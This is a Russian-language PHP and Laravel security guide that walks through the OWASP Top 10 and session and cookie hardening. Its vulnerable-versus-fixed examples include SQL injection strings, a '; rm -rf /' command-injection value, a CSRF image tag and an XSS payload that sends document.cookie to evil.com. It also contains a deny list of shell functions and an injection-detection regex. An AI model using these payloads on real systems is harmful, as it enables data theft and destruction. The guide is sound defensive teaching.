# Security - Безопасность PHP приложений

Полный разбор безопасности: OWASP Top 10, инъекции, XSS, CSRF, аутентификация, шифрование, Laravel security.

---

## 🎯 OWASP Top 10 (2021)

**OWASP (Open Web Application Security Project)** - топ-10 самых критичных уязвимостей.

---

## 🔓 A01: Broken Access Control

### Что это?

Пользователь может получить доступ к данным/функциям, к которым не должен иметь доступа.

### Типы атак

**1. Vertical Privilege Escalation** - повышение привилегий:
```php
// ❌ Уязвимость
Route::get('/admin/users', function() {
    return User::all();  // любой может зайти!
});

// ✅ Правильно
Route::get('/admin/users', function() {
    if (!auth()->user()?->isAdmin()) {
        abort(403);
    }
    return User::all();
})->middleware('auth');

// ✅ Еще лучше - Laravel Middleware
Route::middleware(['auth', 'admin'])->group(function() {
    Route::get('/admin/users', [AdminController::class, 'users']);
});
```

**2. Horizontal Privilege Escalation** - доступ к чужим данным:
```php
// ❌ IDOR (Insecure Direct Object References)
Route::get('/users/{id}/orders', function($id) {
    return Order::where('user_id', $id)->get();
    // Любой может подставить чужой user_id!
});

// ✅ Правильно
Route::get('/users/{id}/orders', function($id) {
    if (auth()->id() !== (int)$id) {
        abort(403, 'Access denied');
    }
    return Order::where('user_id', $id)->get();
});

// ✅ Laravel Policy
Route::get('/users/{user}/orders', function(User $user) {
    $this->authorize('viewOrders', $user);
    return $user->orders;
});
```

### Laravel Authorization

**Gates (простые проверки):**
```php
// app/Providers/AuthServiceProvider.php
Gate::define('update-post', function (User $user, Post $post) {
    return $user->id === $post->user_id;
});

// Использование
if (Gate::allows('update-post', $post)) {
    $post->update($request->all());
}

// Или
Gate::authorize('update-post', $post);  // throws AuthorizationException
```

**Policies (для моделей):**
```php
// app/Policies/PostPolicy.php
class PostPolicy
{
    public function update(User $user, Post $post): bool
    {
        return $user->id === $post->user_id;
    }
    
    public function delete(User $user, Post $post): bool
    {
        return $user->id === $post->user_id || $user->isAdmin();
    }
}

// Controller
public function update(Request $request, Post $post)
{
    $this->authorize('update', $post);
    
    $post->update($request->validated());
}
```

---

## 🔐 A02: Cryptographic Failures

### Password Hashing

**❌ НИКОГДА так:**
```php
// MD5/SHA1 - легко взламываются rainbow tables
$password = md5($request->password);
$password = sha1($request->password);

// Даже с солью - слишком быстрые алгоритмы
$password = sha256($request->password . $salt);
```

**✅ Правильно - bcrypt или Argon2:**
```php
// Bcrypt (default в PHP)
$hash = password_hash($password, PASSWORD_BCRYPT);

// Argon2i (PHP 7.2+)
$hash = password_hash($password, PASSWORD_ARGON2I);

// Argon2id (PHP 7.3+, РЕКОМЕНДУЕТСЯ)
$hash = password_hash($password, PASSWORD_ARGON2ID);

// Проверка
if (password_verify($inputPassword, $hash)) {
    // Correct password
}

// Rehash если алгоритм изменился
if (password_needs_rehash($hash, PASSWORD_ARGON2ID)) {
    $newHash = password_hash($password, PASSWORD_ARGON2ID);
    // Сохранить новый хеш
}
```

**Laravel Hash:**
```php
use Illuminate\Support\Facades\Hash;

// Хеширование
$hash = Hash::make($password);

// Проверка
if (Hash::check($password, $hash)) {
    // Correct
}

// Автоматический rehash
if (Hash::needsRehash($hash)) {
    $hash = Hash::make($password);
}
```

### Шифрование данных

**Laravel Crypt (AES-256-CBC):**
```php
use Illuminate\Support\Facades\Crypt;

// Шифрование
$encrypted = Crypt::encryptString('sensitive data');

// Расшифровка
$decrypted = Crypt::decryptString($encrypted);

// Для массивов/объектов
$encrypted = Crypt::encrypt(['ssn' => '123-45-6789']);
$decrypted = Crypt::decrypt($encrypted);
```

**APP_KEY критически важен:**
```bash
php artisan key:generate  # Генерирует случайный ключ
```

⚠️ **НИКОГДА** не коммитьте .env с production ключами!

### Генерация случайных токенов

```php
// ❌ Не криптографически стойкий
$token = rand(1000, 9999);
$token = uniqid();

// ✅ CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)
$token = bin2hex(random_bytes(32));  // 64 hex символа

// Laravel Str::random()
use Illuminate\Support\Str;

$token = Str::random(64);  // использует random_bytes()
```

### HTTPS везде

```php
// .env
APP_URL=https://example.com

// Force HTTPS
if (!request()->secure() && app()->environment('production')) {
    return redirect()->secure(request()->getRequestUri());
}

// Или middleware
Route::middleware('https')->group(function() {
    // routes
});

// Laravel ForceHttpsMiddleware
class ForceHttpsMiddleware
{
    public function handle($request, Closure $next)
    {
        if (!$request->secure() && app()->environment('production')) {
            return redirect()->secure($request->getRequestUri());
        }
        return $next($request);
    }
}
```

---

## 💉 A03: Injection

### SQL Injection

**❌ Уязвимый код:**
```php
// НИКОГДА не конкатенируй SQL
$email = $_GET['email'];
$sql = "SELECT * FROM users WHERE email = '$email'";
$result = DB::select($sql);

// Атака: ?email=' OR '1'='1
// SELECT * FROM users WHERE email = '' OR '1'='1'
// → Вернет всех пользователей!

// Атака: ?email='; DROP TABLE users; --
// SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
// → Удалит таблицу!
```

**✅ Prepared Statements (параметризованные запросы):**
```php
// PDO Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$email]);

// Или с именованными параметрами
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);

// Laravel Query Builder (автоматически экранирует)
$users = DB::table('users')
    ->where('email', $email)
    ->get();

// Laravel Eloquent
$user = User::where('email', $email)->first();

// Raw запросы с bindings
$users = DB::select('SELECT * FROM users WHERE email = ?', [$email]);
```

**Как работают prepared statements:**
1. **Prepare** - серверу отправляется текст запроса с плейсхолдерами (`WHERE email = ?`). Сервер разбирает его (parse) и запоминает
2. **Execute** - отдельным сообщением отправляются только значения параметров, сервер подставляет их в уже разобранный запрос

- Данные никогда не становятся частью SQL-текста, поэтому внедрить SQL через параметр невозможно
- Бонус: при повторных выполнениях запрос не разбирается заново
- **Эмуляция** (`PDO::ATTR_EMULATE_PREPARES => true`, в чистом PDO MySQL включена по умолчанию, Laravel её отключает): PDO сам экранирует значения и подставляет их в текст, на сервер уходит готовый SQL одним сообщением. Защита работает за счёт экранирования на клиенте (безопасно при правильной кодировке соединения), но настоящей серверной подготовки нет
- Эмуляцию включают при PgBouncer в transaction mode: серверный prepared statement живёт в рамках соединения, а следующая транзакция может попасть на другое (`prepared statement does not exist`). См. [databases/optimization.md](../databases/optimization.md)

**⚠️ Опасность с Raw:**
```php
// ❌ УЯЗВИМО
DB::table('users')->whereRaw("email = '$email'")->get();

// ✅ Правильно
DB::table('users')->whereRaw("email = ?", [$email])->get();
```

### XSS (Cross-Site Scripting)

**Типы XSS:**
1. **Stored XSS** - хранится в БД
2. **Reflected XSS** - отражается в ответе
3. **DOM-based XSS** - в JavaScript на клиенте

**❌ Уязвимый код:**
```php
// Stored XSS
$comment = $_POST['comment'];
DB::insert("INSERT INTO comments (text) VALUES ('$comment')");

// Атака: <script>alert('XSS')</script>
// При выводе комментария выполнится JS!

// Вывод без экранирования
echo "<div>" . $comment . "</div>";  // ❌ XSS!
```

**✅ Output Escaping:**
```php
// htmlspecialchars (базовая защита)
echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
// <script> → &lt;script&gt; (не выполнится)

// htmlentities (все символы)
echo htmlentities($comment, ENT_QUOTES, 'UTF-8');
```

**Laravel Blade (автоматическое экранирование):**
```blade
{{-- ✅ Экранируется автоматически --}}
<div>{{ $comment }}</div>

{{-- ❌ Без экранирования (ОПАСНО) --}}
<div>{!! $comment !!}</div>

{{-- Используй {!! !!} только для проверенного HTML --}}
<div>{!! Purifier::clean($userHtml) !!}</div>
```

**HTML Purifier для rich text:**
```php
composer require mews/purifier

// config/purifier.php
'default' => [
    'HTML.Allowed' => 'p,b,i,u,a[href],ul,ol,li',
]

// Использование
use Mews\Purifier\Facades\Purifier;

$clean = Purifier::clean($userHtml);
```

### Content Security Policy (CSP)

```php
// Заголовок CSP
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'");

// Laravel Middleware
class ContentSecurityPolicy
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);
        
        $response->headers->set('Content-Security-Policy', 
            "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; object-src 'none'"
        );
        
        return $response;
    }
}
```

### Command Injection

```php
// ❌ УЯЗВИМО
$filename = $_GET['file'];
exec("cat $filename");

// Атака: ?file=test.txt; rm -rf /

// ✅ Экранирование
$filename = escapeshellarg($filename);
exec("cat " . $filename);

// ✅ Еще лучше - избегать shell
$content = file_get_contents($filename);
```

---

## 🔒 A04: Insecure Design

### Threat Modeling

1. **Идентификация активов** (данные пользователей, API keys)
2. **Анализ угроз** (STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)
3. **Оценка рисков** (вероятность × ущерб)
4. **Mitigation** (снижение рисков)

### Secure by Default

```php
// ❌ Небезопасные дефолты
class User {
    public bool $isAdmin = true;  // Все админы по умолчанию!
}

// ✅ Безопасные дефолты
class User {
    public bool $isAdmin = false;
    public bool $isActive = false;
    public bool $emailVerified = false;
}
```

---

## ⚙️ A05: Security Misconfiguration

### Debug Mode OFF в production

```php
// .env
APP_DEBUG=false
APP_ENV=production

// Проверка
if (config('app.debug') && app()->environment('production')) {
    throw new \Exception('DEBUG MODE IN PRODUCTION!');
}
```

### Display Errors OFF

```php
// php.ini (production)
display_errors = Off
log_errors = On
error_log = /var/log/php/errors.log

// .htaccess
php_flag display_errors Off
```

### Security Headers

```php
class SecurityHeadersMiddleware
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);
        
        $response->headers->set('X-Frame-Options', 'DENY');  // Clickjacking
        $response->headers->set('X-Content-Type-Options', 'nosniff');  // MIME sniffing
        $response->headers->set('X-XSS-Protection', '1; mode=block');  // XSS (legacy)
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');  // HSTS
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
        
        return $response;
    }
}
```

### Удалить ненужные features

```php
// composer.json - только production зависимости
composer install --no-dev

// Отключить опасные функции PHP
// php.ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

// Laravel - скрыть версию
// public/.htaccess
Header unset X-Powered-By
```

---

## 📦 A06: Vulnerable and Outdated Components

### Проверка зависимостей

```bash
# Composer Audit (встроено с 2.4+)
composer audit

# Проверить устаревшие пакеты
composer outdated

# Обновить зависимости
composer update

# Security Checker (SensioLabs)
composer require --dev sensiolabs/security-checker
vendor/bin/security-checker security:check
```

### Регулярные обновления

```json
// composer.json
{
    "require": {
        "laravel/framework": "^10.0",  // Автообновление минорных версий
        "guzzlehttp/guzzle": "^7.0"
    }
}
```

---

## 🔑 A07: Identification and Authentication Failures

### Brute Force Protection

**Laravel Rate Limiting:**
```php
// routes/web.php
Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:5,1');  // 5 попыток в минуту

// Custom rate limiter
RateLimiter::for('login', function (Request $request) {
    return Limit::perMinute(5)->by($request->ip());
});

// В Controller
public function login(Request $request)
{
    RateLimiter::hit('login:' . $request->ip());
    
    if (RateLimiter::tooManyAttempts('login:' . $request->ip(), 5)) {
        $seconds = RateLimiter::availableIn('login:' . $request->ip());
        abort(429, "Too many attempts. Try again in {$seconds} seconds.");
    }
    
    // Логика аутентификации
}
```

### Multi-Factor Authentication (MFA)

```php
// Laravel Fortify
composer require laravel/fortify

// config/fortify.php
'features' => [
    Features::twoFactorAuthentication([
        'confirmPassword' => true,
    ]),
],

// Включить 2FA для пользователя
$user->enableTwoFactorAuthentication();

// Проверка 2FA кода
if ($user->two_factor_secret) {
    // Показать форму для 2FA кода
}
```

### Session Security

```php
// config/session.php
'secure' => true,      // Только HTTPS
'http_only' => true,   // Недоступна для JavaScript
'same_site' => 'lax',  // CSRF защита

// Session fixation prevention (Laravel делает автоматически)
Auth::login($user);
request()->session()->regenerate();
```

### Password Requirements

```php
// Validation rules
$request->validate([
    'password' => [
        'required',
        'confirmed',
        'min:12',
        Password::min(12)
            ->letters()
            ->mixedCase()
            ->numbers()
            ->symbols()
            ->uncompromised(),  // Проверка в Have I Been Pwned
    ],
]);
```

### Secure Password Reset

```php
// 1. Генерировать криптостойкий токен
$token = Str::random(64);

// 2. Хранить hash токена (не сам токен)
DB::table('password_reset_tokens')->insert([
    'email' => $email,
    'token' => Hash::make($token),
    'created_at' => now(),
]);

// 3. Expiration (15 минут)
$reset = DB::table('password_reset_tokens')
    ->where('email', $email)
    ->where('created_at', '>', now()->subMinutes(15))
    ->first();

// 4. One-time use
DB::table('password_reset_tokens')->where('email', $email)->delete();
```

---

## 🛡️ A08: Software and Data Integrity Failures

### Composer Lock File

```bash
# Всегда коммить composer.lock
git add composer.lock
git commit -m "Lock dependencies"

# CI/CD проверка
composer validate --strict
```

### Code Signing

```php
// Проверка подписи обновлений
$signature = hash_hmac('sha256', $updateData, env('UPDATE_SECRET'));

if (!hash_equals($signature, $receivedSignature)) {
    throw new \Exception('Invalid signature');
}
```

### Deserialization Attacks

```php
// ❌ ОПАСНО - unserialize() уязвим к Object Injection
$data = unserialize($_COOKIE['data']);

// ✅ Используй JSON
$data = json_decode($_COOKIE['data'], true);

// Или для объектов - verify signature
$serialized = serialize($object);
$signature = hash_hmac('sha256', $serialized, env('APP_KEY'));

// При десериализации
if (!hash_equals($signature, $receivedSignature)) {
    throw new \Exception('Tampered data');
}
```

---

## 📊 A09: Security Logging and Monitoring Failures

### Логирование событий безопасности

```php
use Illuminate\Support\Facades\Log;

// Логировать важные события
class AuthController
{
    public function login(Request $request)
    {
        Log::info('Login attempt', [
            'email' => $request->email,
            'ip' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);
        
        if (Auth::attempt($credentials)) {
            Log::info('Successful login', [
                'user_id' => auth()->id(),
                'email' => $request->email,
                'ip' => $request->ip(),
            ]);
        } else {
            Log::warning('Failed login attempt', [
                'email' => $request->email,
                'ip' => $request->ip(),
            ]);
        }
    }
    
    public function logout(Request $request)
    {
        Log::info('User logout', [
            'user_id' => auth()->id(),
            'ip' => $request->ip(),
        ]);
        
        Auth::logout();
    }
}
```

### Мониторинг подозрительной активности

```php
class SecurityMonitor
{
    public function detectAnomalies(Request $request): void
    {
        // Множественные failed logins
        $failedAttempts = Cache::get("failed_login:{$request->ip()}", 0);
        
        if ($failedAttempts > 10) {
            Log::alert('Possible brute force attack', [
                'ip' => $request->ip(),
                'attempts' => $failedAttempts,
            ]);
            
            // Уведомить админа
            Mail::to('admin@example.com')->send(new SecurityAlert());
        }
        
        // SQL injection patterns
        if (preg_match('/(\bUNION\b|\bSELECT\b.*\bFROM\b)/i', $request->getQueryString())) {
            Log::critical('Possible SQL injection attempt', [
                'ip' => $request->ip(),
                'query' => $request->getQueryString(),
            ]);
        }
    }
}
```

---

## 🌐 A10: Server-Side Request Forgery (SSRF)

### Что это?

Атакующий заставляет сервер делать HTTP-запросы к внутренним ресурсам.

**❌ Уязвимый код:**
```php
// Атака: ?url=http://localhost/admin
// Или: ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
$url = $_GET['url'];
$response = file_get_contents($url);
```

**✅ Защита:**
```php
class UrlValidator
{
    private array $allowedHosts = [
        'api.example.com',
        'cdn.example.com',
    ];
    
    public function validate(string $url): bool
    {
        $parsed = parse_url($url);
        
        // Whitelist разрешенных хостов
        if (!in_array($parsed['host'], $this->allowedHosts)) {
            throw new \Exception('Host not allowed');
        }
        
        // Блокировать private IP ranges
        $ip = gethostbyname($parsed['host']);
        if ($this->isPrivateIp($ip)) {
            throw new \Exception('Private IP not allowed');
        }
        
        // Только HTTP/HTTPS
        if (!in_array($parsed['scheme'], ['http', 'https'])) {
            throw new \Exception('Invalid scheme');
        }
        
        return true;
    }
    
    private function isPrivateIp(string $ip): bool
    {
        return !filter_var(
            $ip,
            FILTER_VALIDATE_IP,
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
        );
    }
}
```

---

## 🔐 CSRF (Cross-Site Request Forgery)

### Что это?

Атакующий заставляет пользователя выполнить нежелательное действие на сайте, где он аутентифицирован.

**Атака:**
```html
<!-- Сайт злоумышленника -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Если пользователь залогинен на bank.com, перевод выполнится! -->
```

**Laravel CSRF Protection:**
```blade
{{-- Blade автоматически добавляет токен --}}
<form method="POST" action="/profile">
    @csrf
    <input type="text" name="name" />
    <button type="submit">Update</button>
</form>

{{-- Или вручную --}}
<input type="hidden" name="_token" value="{{ csrf_token() }}" />
```

**Middleware VerifyCsrfToken:**
```php
// app/Http/Middleware/VerifyCsrfToken.php
protected $except = [
    'api/*',  // API routes обычно используют token authentication
    'webhook/*',  // Webhooks от внешних сервисов
];
```

**AJAX с CSRF:**
```javascript
// В layout
<meta name="csrf-token" content="{{ csrf_token() }}">

// JavaScript
const token = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/endpoint', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': token
    },
    body: JSON.stringify(data)
});

// Или Axios (автоматически)
axios.defaults.headers.common['X-CSRF-TOKEN'] = token;
```

**SameSite Cookies (дополнительная защита):**
```php
// config/session.php
'same_site' => 'lax',  // или 'strict'
```

---

## 📁 File Upload Security

### Валидация файлов

```php
$request->validate([
    'avatar' => [
        'required',
        'file',
        'image',  // только изображения
        'mimes:jpeg,png,jpg',  // разрешенные типы
        'max:2048',  // макс 2MB
        'dimensions:max_width=2000,max_height=2000',
    ],
]);
```

### Проверка MIME type

```php
$file = $request->file('document');

// ❌ Не доверять расширению
$extension = $file->getClientOriginalExtension();

// ✅ Проверять MIME type
$mime = $file->getMimeType();

if (!in_array($mime, ['application/pdf', 'image/jpeg'])) {
    throw new \Exception('Invalid file type');
}
```

### Переименовывать файлы

```php
// ❌ Использовать оригинальное имя
$file->storeAs('uploads', $file->getClientOriginalName());

// ✅ Генерировать случайное имя
$filename = Str::random(40) . '.' . $file->extension();
$file->storeAs('uploads', $filename);

// ✅ Или hashName() (Laravel)
$path = $file->store('uploads');  // автоматически генерирует hash
```

### Хранить вне webroot

```php
// ✅ Storage не доступен напрямую через HTTP
$file->store('private/documents');

// Для скачивания через контроллер
Route::get('/documents/{id}', function($id) {
    $document = Document::findOrFail($id);
    
    // Проверка прав доступа
    if (auth()->id() !== $document->user_id) {
        abort(403);
    }
    
    return Storage::download($document->path, $document->original_name);
});
```

### Сканирование на вирусы

```php
composer require xenolope/quahog

use Xenolope\Quahog\Client;

$quahog = new Client('unix:///var/run/clamav/clamd.sock');

$result = $quahog->scanFile($file->getRealPath());

if ($result['status'] === 'FOUND') {
    throw new \Exception('Virus detected: ' . $result['reason']);
}
```

---

## � Sessions & Cookies Security

### Sessions (Сессии)

**Session** - механизм для хранения данных пользователя между HTTP запросами.

#### Базовая работа

```php
// Старт сессии
session_start();

// Запись данных
$_SESSION['user_id'] = 123;
$_SESSION['username'] = 'john';

// Чтение данных
$userId = $_SESSION['user_id'] ?? null;

// Удаление конкретного ключа
unset($_SESSION['user_id']);

// Полное уничтожение сессии
session_destroy();

// Регенерация ID (важно для безопасности!)
session_regenerate_id(true);
```

#### Session Handlers (хранилища)

**По умолчанию:** файлы на диске (`/tmp` или `session.save_path`)

```php
// php.ini
session.save_handler = files
session.save_path = "/var/lib/php/sessions"
```

**Database Handler** (для кластеров):

```php
// Laravel автоматически использует database/redis handler
// config/session.php
'driver' => env('SESSION_DRIVER', 'database'),
```

**Redis Handler** (рекомендуется для production):

```php
// config/session.php
'driver' => 'redis',
'connection' => 'session',

// .env
SESSION_DRIVER=redis
REDIS_HOST=127.0.0.1
```

**Custom Handler:**

```php
class DatabaseSessionHandler implements SessionHandlerInterface
{
    public function open($savePath, $sessionName): bool
    {
        return true;
    }
    
    public function close(): bool
    {
        return true;
    }
    
    public function read($id): string
    {
        $session = DB::table('sessions')->where('id', $id)->first();
        return $session ? $session->data : '';
    }
    
    public function write($id, $data): bool
    {
        DB::table('sessions')->updateOrInsert(
            ['id' => $id],
            [
                'data' => $data,
                'last_activity' => time(),
            ]
        );
        return true;
    }
    
    public function destroy($id): bool
    {
        DB::table('sessions')->where('id', $id)->delete();
        return true;
    }
    
    public function gc($lifetime): int
    {
        $expired = time() - $lifetime;
        return DB::table('sessions')
            ->where('last_activity', '<', $expired)
            ->delete();
    }
}

// Регистрация
session_set_save_handler(new DatabaseSessionHandler(), true);
session_start();
```

#### Session Security Threats

**1. Session Hijacking (перехват сессии):**

```php
// ❌ Уязвимость: передача session ID в URL
https://example.com/page?PHPSESSID=abc123

// ✅ Решение: только в cookies
ini_set('session.use_only_cookies', 1);
ini_set('session.use_trans_sid', 0);  // Отключить передачу в URL
```

**2. Session Fixation (фиксация сессии):**

```php
// ❌ Атака
// 1. Злоумышленник создает сессию: PHPSESSID=malicious123
// 2. Передает жертве: https://site.com/?PHPSESSID=malicious123
// 3. Жертва логинится → её данные в известной сессии
// 4. Злоумышленник использует PHPSESSID=malicious123 → доступ!

// ✅ Защита: регенерация ID после login
session_start();

if ($user->login($email, $password)) {
    // Создать новый session ID, удалить старый
    session_regenerate_id(true);
    $_SESSION['user_id'] = $user->id;
}

// Laravel делает это автоматически при login:
Auth::attempt($credentials);  // регенерирует session ID
```

**3. Session Cookie Theft (кража cookie через XSS):**

```php
// ✅ HttpOnly flag - недоступно для JavaScript
ini_set('session.cookie_httponly', 1);

// Cookie не доступна через document.cookie
// XSS-скрипт не сможет её украсть
```

**4. Man-in-the-Middle (перехват через HTTP):**

```php
// ✅ Secure flag - только по HTTPS
ini_set('session.cookie_secure', 1);

// Cookie передается только по HTTPS, не по HTTP
```

**5. CSRF (Cross-Site Request Forgery):**

```php
// ✅ SameSite cookie attribute
ini_set('session.cookie_samesite', 'Lax');  // или 'Strict'

// Cookie не отправляется при cross-site запросах
```

#### Полная конфигурация для production

**php.ini:**

```ini
; Session ID в cookies, не в URL
session.use_only_cookies = 1
session.use_trans_sid = 0

; Secure cookies (только HTTPS)
session.cookie_secure = 1

; HttpOnly (защита от XSS)
session.cookie_httponly = 1

; SameSite (защита от CSRF)
session.cookie_samesite = "Lax"

; Время жизни сессии
session.gc_maxlifetime = 1440  ; 24 минуты
session.cookie_lifetime = 0    ; До закрытия браузера

; Имя cookie (изменить дефолтное PHPSESSID)
session.name = "APP_SESSION"

; Путь к хранилищу
session.save_handler = redis
session.save_path = "tcp://127.0.0.1:6379"

; Энтропия для генерации session ID (по умолчанию достаточно)
session.sid_length = 48
session.sid_bits_per_character = 6
```

**Laravel config/session.php:**

```php
return [
    'driver' => env('SESSION_DRIVER', 'redis'),
    'lifetime' => env('SESSION_LIFETIME', 120),  // минуты
    'expire_on_close' => false,
    'encrypt' => true,  // Шифрование данных сессии
    'files' => storage_path('framework/sessions'),
    'connection' => env('SESSION_CONNECTION', null),
    'table' => 'sessions',
    'store' => env('SESSION_STORE', null),
    'lottery' => [2, 100],  // 2% шанс запуска garbage collection
    'cookie' => env('SESSION_COOKIE', Str::slug(env('APP_NAME', 'laravel'), '_').'_session'),
    'path' => '/',
    'domain' => env('SESSION_DOMAIN', null),
    'secure' => env('SESSION_SECURE_COOKIE', true),  // Только HTTPS
    'http_only' => true,  // HttpOnly flag
    'same_site' => 'lax',  // SameSite attribute
];
```

#### Best Practices

```php
// ✅ Регенерация ID после критичных действий
public function login(Request $request)
{
    if (Auth::attempt($credentials)) {
        $request->session()->regenerate();  // Новый session ID
        return redirect('/dashboard');
    }
}

// ✅ Хранение метаданных для проверки
session_start();

if (!isset($_SESSION['initialized'])) {
    $_SESSION['initialized'] = true;
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
}

// Проверка на hijacking
if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
    session_destroy();
    die('Session hijacking detected!');
}

// ✅ Timeout для неактивности
$_SESSION['last_activity'] = time();

if (time() - $_SESSION['last_activity'] > 1800) {
    session_unset();
    session_destroy();
    header('Location: /login?timeout=1');
    exit;
}

// ✅ Разные сессии для admin
if ($user->isAdmin()) {
    ini_set('session.cookie_name', 'ADMIN_SESSION');
    session_start();
}
```

---

### Cookies Security

**Cookie** - небольшой файл, хранящийся в браузере пользователя.

#### Базовая работа

```php
// Установка cookie
setcookie('username', 'john', [
    'expires' => time() + 3600,  // 1 час
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,      // Только HTTPS
    'httponly' => true,    // Недоступно для JS
    'samesite' => 'Lax',   // CSRF защита
]);

// Чтение cookie
$username = $_COOKIE['username'] ?? null;

// Удаление cookie (установить expires в прошлом)
setcookie('username', '', [
    'expires' => time() - 3600,
    'path' => '/',
]);
```

#### Cookie Attributes для безопасности

**1. Secure flag** - только HTTPS:

```php
setcookie('token', $value, [
    'secure' => true,  // ✅ Cookie передается только по HTTPS
]);

// ❌ Без Secure - может быть перехвачена по HTTP
setcookie('token', $value);
```

**2. HttpOnly flag** - защита от XSS:

```php
setcookie('session_token', $value, [
    'httponly' => true,  // ✅ Недоступна через JavaScript
]);

// ❌ Без HttpOnly - доступна через document.cookie
// XSS-скрипт может украсть: fetch('https://evil.com?c=' + document.cookie)
```

**3. SameSite attribute** - защита от CSRF:

```php
// Strict - cookie НЕ отправляется при переходе с другого сайта
setcookie('admin_token', $value, [
    'samesite' => 'Strict',
]);
// Использовать для критичных cookies (admin панель)

// Lax - cookie отправляется только при GET с другого сайта
setcookie('user_session', $value, [
    'samesite' => 'Lax',  // ✅ Рекомендуется по умолчанию
]);
// Login cookie, обычные сессии

// None - cookie отправляется всегда (требует Secure)
setcookie('tracking', $value, [
    'samesite' => 'None',
    'secure' => true,  // Обязательно с SameSite=None
]);
// Для iframe, cross-site интеграций
```

**Разница SameSite:**

```php
// Пользователь на evil.com нажимает ссылку на yourapp.com

// SameSite=Strict: cookie НЕ отправится → пользователь не залогинен
// SameSite=Lax: cookie отправится → пользователь залогинен ✅
// SameSite=None: cookie отправится всегда

// Пользователь на evil.com, JS делает POST на yourapp.com/delete

// SameSite=Strict: cookie НЕ отправится → CSRF защита ✅
// SameSite=Lax: cookie НЕ отправится → CSRF защита ✅
// SameSite=None: cookie отправится → CSRF возможен ❌
```

**4. Domain и Path:**

```php
// Доступна на example.com и всех поддоменах
setcookie('token', $value, [
    'domain' => '.example.com',  // ✅ api.example.com, www.example.com
]);

// Доступна только на example.com
setcookie('token', $value, [
    'domain' => 'example.com',  // ❌ НЕ работает на api.example.com
]);

// Доступна только на /admin/*
setcookie('admin_token', $value, [
    'path' => '/admin',
]);
```

#### Cookie Prefixes (дополнительная безопасность)

```php
// __Secure- prefix: обязателен Secure flag
setcookie('__Secure-token', $value, [
    'secure' => true,  // Обязательно!
]);

// __Host- prefix: Secure + Path=/ + без Domain
setcookie('__Host-token', $value, [
    'secure' => true,
    'path' => '/',
    // domain НЕ устанавливается (только текущий хост)
]);
```

#### Защита от атак

**1. Cookie Theft через XSS:**

```php
// ❌ Уязвимость
echo "Hello, " . $_GET['name'];  // XSS!
// Атака: ?name=<script>fetch('https://evil.com?c='+document.cookie)</script>

// ✅ Защита 1: HttpOnly cookie
setcookie('session', $value, ['httponly' => true]);
// Cookie недоступна для JavaScript

// ✅ Защита 2: Экранирование output
echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES);
```

**2. CSRF через Cookie:**

```php
// ❌ Уязвимость: форма на evil.com отправляет POST на yourapp.com
<form action="https://yourapp.com/delete-account" method="POST">
    <button>Click me!</button>
</form>
// Cookie отправится автоматически → аккаунт удален!

// ✅ Защита 1: SameSite cookie
setcookie('session', $value, ['samesite' => 'Lax']);

// ✅ Защита 2: CSRF token (см. раздел CSRF выше)
```

**3. Man-in-the-Middle:**

```php
// ❌ Cookie передается по HTTP → может быть перехвачена
setcookie('session', $value);

// ✅ Только HTTPS
setcookie('session', $value, ['secure' => true]);

// ✅ + HSTS header
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
```

#### Laravel Cookie Helpers

```php
// Установка cookie
return response('Hello')
    ->cookie('name', 'value', $minutes);

// С параметрами
return response('Hello')
    ->cookie('name', 'value', $minutes, $path, $domain, $secure, $httpOnly, false, $sameSite);

// Cookie facade
use Illuminate\Support\Facades\Cookie;

Cookie::queue('name', 'value', $minutes);

// Чтение
$value = Cookie::get('name');
$value = $request->cookie('name');

// Удаление
Cookie::queue(Cookie::forget('name'));

// Encrypted cookies (Laravel по умолчанию шифрует все cookies)
// app/Http/Middleware/EncryptCookies.php
protected $except = [
    'unencrypted_cookie',  // Исключения из шифрования
];
```

#### Best Practices

```php
// ✅ Полная безопасная cookie
setcookie('session_token', $value, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => '',  // Только текущий хост
    'secure' => true,      // Только HTTPS
    'httponly' => true,    // Защита от XSS
    'samesite' => 'Lax',   // Защита от CSRF
]);

// ✅ Не храни чувствительные данные в cookies
// ❌ Плохо
setcookie('credit_card', '1234-5678-9012-3456');

// ✅ Хорошо: храни только session ID
setcookie('session_id', $randomToken);
// Данные в БД/Redis по session_id

// ✅ Используй подписанные cookies для integrity
// Laravel делает автоматически
$value = Cookie::get('signed_cookie');  // Проверяет подпись

// ✅ Короткое время жизни для критичных cookies
setcookie('admin_token', $value, [
    'expires' => time() + 300,  // 5 минут
]);

// ✅ Разные cookies для разных уровней доступа
setcookie('user_session', $userToken, ['samesite' => 'Lax']);
setcookie('admin_session', $adminToken, ['samesite' => 'Strict']);
```

---

## �🎓 Laravel Security Checklist

### ✅ Обязательные меры

1. **APP_KEY** - установлен и секретный
